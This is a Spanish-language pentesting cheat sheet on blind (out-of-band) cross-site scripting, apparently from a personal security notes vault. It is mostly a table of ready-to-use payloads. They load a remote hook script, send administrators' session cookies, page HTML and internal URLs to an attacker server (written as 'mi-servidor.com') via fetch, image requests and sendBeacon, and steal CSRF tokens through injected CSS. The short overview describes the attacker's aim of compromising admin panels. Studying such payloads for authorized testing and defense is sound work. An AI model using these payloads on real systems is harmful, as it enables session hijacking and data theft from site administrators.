---
aliases: null
tags:
  - type/technique
  - vuln/xss
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[Cross-Site Scripting (XSS)]]'
---
# XSS - Explotación Out-of-Band (Blind XSS)

___

## Cheatsheet

|                                           **Payload / Mecanismo OOB**                                           |                   **Contexto de Inyección**                   |                                                                                                            **Descripción de Explotación y Exfiltración**                                                                                                             |
|:---------------------------------------------------------------------------------------------------------------:|:-------------------------------------------------------------:|:--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------:|
|                    <br><pre><code>`<script src="https://mi-servidor.com/hook.js"></script>`                     |        <br><br><br>Inyección directa de script remoto.        |                 <br>El vector más versátil. Si la aplicación no cuenta con un [[Content Security Policy]] (CSP) estricto, permite cargar infraestructuras completas de post-explotación (como XSS Hunter o BeEF) en el panel administrativo.<br><br>                 |
|        <br><pre><code>`<script>fetch('https://mi-servidor.com/log?c=' + btoa(document.cookie))</script>`        | <br>Bloques de script preexistentes o inyecciones permitidas. |                                     <br>Utiliza la API Fetch para enviar datos de forma asíncrona. En este caso, codifica en Base64 las cookies de sesión del administrador y las exfiltra a través de un parámetro GET.<br><br>                                     |
| <br><pre><code>`<img src="x" onerror="this.src='https://mi-servidor.com/?dom='+btoa(document.body.innerHTML)">` |  <br>Filtrado de etiquetas `<script>` (Evasión vía eventos).  |              <br>Útil si el panel de administración filtra scripts directos pero permite HTML básico. Fuerza un error de carga de imagen para disparar el manejador de eventos y exfiltrar, por ejemplo, el código fuente de la página interna.<br><br>              |
|        <br><pre><code>`<script>new Image().src="https://mi-servidor.com/?url="+location.href;</script>`         |                 <br><br>Inyección silenciosa.                 |                              <br>Crea un objeto de imagen en memoria sin insertarlo en el [[DOM]]. Genera una petición HTTP GET instantánea y completamente invisible para la víctima, ideal para robar URLs internas ocultas.<br><br>                               |
|            <br><pre><code>`"><link rel="stylesheet" href="https://mi-servidor.com/log.css">`<br><br>            |     <br><br>Exfiltración sin JavaScript (CSS Injection).      | <br>Vector alternativo cuando la ejecución de JavaScript está completamente deshabilitada o fuertemente bloqueada. Permite cargar un CSS malicioso externo que utilice selectores de atributos para robar tokens CSRF o datos del DOM carácter por carácter.<br><br> |
|    <br><pre><code>`<script>navigator.sendBeacon('https://mi-servidor.com/recv', document.cookie);</script>`     |             <br><br>Evasión de cierres de página.             |                            <br>La API `sendBeacon` garantiza que la petición HTTP POST se envíe en segundo plano incluso si el administrador cierra la pestaña del navegador inmediatamente después de abrir la página infectada.<br><br>                            |
^xss-blind

___

## Overview

El [[Blind XSS]] es una variante donde el punto de inyección y el punto de ejecución están completamente separados, ocurriendo la ejecución generalmente en el backend o en paneles administrativos a los que no tengo acceso. Como no puedo observar el reflejo del payload en mi propia sesión, recurro a la explotación Out-of-Band (OOB). Esta técnica consiste en inyectar un payload ciego diseñado para forzar al navegador de la víctima (ej. un administrador revisando logs) a realizar una petición de red hacia un servidor externo bajo mi control, confirmando la vulnerabilidad y exfiltrando datos sensibles en el proceso.
